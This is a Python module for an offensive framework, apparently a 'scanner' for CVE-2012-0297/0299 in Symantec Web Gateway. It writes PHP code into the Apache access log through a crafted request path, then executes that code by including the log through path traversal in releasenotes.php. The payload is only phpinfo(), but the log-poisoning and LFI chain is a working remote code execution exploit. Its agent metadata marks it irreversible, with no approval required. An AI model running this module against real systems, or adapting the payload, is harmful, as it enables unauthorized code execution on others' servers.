#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Symantec Web Gateway access_log LFI + PHP injection (CVE-2012-0297/0299)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Symantec Web Gateway - releasenotes LFI Detection (CVE-2012-0297)',
        'description': (
            'Detects CVE-2012-0297/0299 by injecting PHP into access_log via a crafted '
            'GET path then including it through releasenotes.php?relfile=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'symantec', 'lfi', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-0297',
        ],
        'cve': 'CVE-2012-0297',
    }

    def run(self):
        for base in ('', '/spywall'):
            # poison log
            poison = f'{base}/<?php phpinfo();?>'
            self.http_request(method='GET', path=poison, allow_redirects=False)
            path = (
                f'{base}/spywall/releasenotes.php?relfile='
                '../../../../../usr/local/apache2/logs/access_log'
            )
            if base == '/spywall':
                path = (
                    f'{base}/releasenotes.php?relfile='
                    '../../../../../usr/local/apache2/logs/access_log'
                )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if '<title>phpinfo()' in body and 'Symantec Web Gateway' in body:
                self.set_info(
                    severity='critical',
                    reason='Symantec WG LFI/RCE (CVE-2012-0297)',
                    path=path.split('?')[0],
                )
                return True
        return False
